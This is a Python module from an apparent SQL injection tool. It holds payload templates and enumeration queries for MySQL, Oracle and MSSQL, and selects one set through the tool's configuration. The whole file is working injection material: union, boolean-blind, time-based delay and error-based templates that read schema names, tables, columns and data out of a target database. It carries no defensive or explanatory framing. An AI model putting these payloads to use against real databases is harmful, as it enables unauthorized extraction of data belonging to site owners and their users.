#! /usr/bin/env python
# -*- coding:utf-8 -*-
# author:flystart
# home:www.flystart.org

from lib.core.data import SQL,BOUNDARY
from lib.core.common import conf

SEP_CHAR = " "
'''
    database boundarys and query payload
'''
mysql_boundarys = {
    "union":"and 5=8 (%query)",
    "length":" and length(%query)=%value",
    "double_length":"and length(%query)>%value",
    "time_length":"and if((length(%query)>%value),sleep({T}),0)".format(T = conf.time_sec),
    "count_enmu":"and %query = %value",
    "blind_count":"and %query > %value",
    "time_count":"and if((%query > %value),sleep({T}),0)".format(T = conf.time_sec),
    "blind_enmu":"and ord(substr((%query) from %index for 1))=%value",
    "blind":"and ord(substr((%query) from %index for 1))>%value",
    #"error":"and exp(~(select * from(select (%query))a))"
    "union":"and 9=7 union (%query)",
    "time":"and if((ord(substr((%query) from %index for 1))>%value),sleep({T}),0)".format(T = conf.time_sec),
    "error":"and ((select 1 from(select count(*),concat((select (%query) from information_schema.schemata limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a))"
}
mysql_payloads = {
    "query":"(select %s from t_n)",
    "base_query":"(select %s from t_n limit %d,1)",
    "base_query2":"(select group_concat(%s) from t_n)",
    "query_tab":"(select %s from t_n where table_schema={db} limit %d,1)",
    "query_col":"(select %s from t_n where table_schema={db} and table_name={table} limit %d,1)"
}

oracle_boundarys = {
    "length":"and length(%query)=%value",
    "time_length":"and 5=(CASE WHEN (length(%query)>%value) THEN DBMS_PIPE.RECEIVE_MESSAGE(1,{T}) ELSE 0 END)".format(T = conf.time_sec),
    "double_length":"and length(%query)>%value",
    "count":"and %query = %value",
    "blind_count":"and %query > %value",
    "time_count":"and 5=(CASE WHEN (%query>%value) THEN DBMS_PIPE.RECEIVE_MESSAGE(1,{T}) ELSE 0 END)".format(T = conf.time_sec),
    "blind_enmu":"and ascii(substr(cast((%query)as varchar(4000)),%index,1))=%value",
    "blind":"and ascii(substr(cast((%query)as varchar(4000)),%index,1))>%value",
    "time":"5=(CASE WHEN (ascii(substr(%query,%index,1))>%value) THEN DBMS_PIPE.RECEIVE_MESSAGE(1,{T}) ELSE 0 END)".format(T = conf.time_sec),
    #"error":"and exp(~(select * from(select (%query))a))"
    "union":"and 9=7 union (%query)",
    "error":"and 1=upper(xmltype(chr(60)||chr(58)||chr(45)||chr(45)||chr(58)||cast((%query)as varchar(4000))||chr(58)||chr(45)||chr(45)||chr(58)))"
}

oracle_payloads = {
    "query":"(select %s from t_n)",
    "base_query":"(select temp from (select (%s) as temp,ROWNUM as limit from t_n) where limit=%d)",
    "query_tab":"(select tn from (select (%s) as tn, ROWNUM as limit from all_tables where owner=upper({db})) where limit=%d)",
    "query_all_tab":"(select (%s) from t_n where owner=upper({db}))",
    "query_col":"(select col from (select (%s) as col,ROWNUM as limit from all_TAB_COLUMNS where owner=upper({db}) and table_name=upper({table}))  where limit=%d)",
    "query_all_col":"(select (%s) from all_TAB_COLUMNS where owner=upper({db}) and table_name=upper({table}))"
}
mssql_boundarys = {
    "length":"and len(%query)=%value",
    "time_length":"if(len(%query)>%value) WAITFOR DELAY '0:0:{T}'".format(T = conf.time_sec),
    "double_length":"and len(%query)>%value",
    "count":"and %query = %value",
    "blind_count":"and %query > %value",
    "time_count":"if(%query>%value) WAITFOR DELAY '0:0:{T}'".format(T = conf.time_sec),
    "blind_enmu":"and ascii(substring(%query,%index,1))=%value",
    "blind":"and ascii(substring((cast((%query) as varchar(2000))),%index,1))>%value",
    "time":"if(ascii(substring((cast((%query) as varchar(2000))),%index,1))>%value) WAITFOR DELAY '0:0:{T}'".format(T = conf.time_sec),
    #"error":"and exp(~(select * from(select (%query))a))"
    "union":"and 9=7 union (%query)",
    "error":"and convert(int,(char(58)+char(45)+char(45)+char(58)+cast((%query) as varchar(2000))+char(58)+char(45)+char(45)+char(58)))=1"
}
mssql_payloads = {
    "query":"(select %s from t_n)",
    "base_query":"(select temp from (select ROW_NUMBER() OVER(order by (select 0)) AS limit,(%s) as temp from t_n)xx where limit=%d)",
    "query_tab":"(select tn from (select  ROW_NUMBER() OVER(order by (select 0)) AS limit,(%s) as tn from {db}.t_n)xx where limit=%d)",
    "query_all_tab":"(select (%s) from {db}.t_n)",
    "query_col":"(select col from (select  ROW_NUMBER() OVER(order by (select 0)) AS limit, (%s) as col from {db}.information_schema.columns where TABLE_NAME={table})xx where limit=%d)",
    "query_all_col":"(select (%s) from {db}.information_schema.columns where TABLE_NAME={table})"
}

if conf.dbms == 'mysql':
    BOUNDARY.update(mysql_boundarys)
    SQL.update(mysql_payloads)
if conf.dbms == 'oracle':
    BOUNDARY.update(oracle_boundarys)
    SQL.update(oracle_payloads)
if conf.dbms == 'mssql':
    BOUNDARY.update(mssql_boundarys)
    SQL.update(mssql_payloads)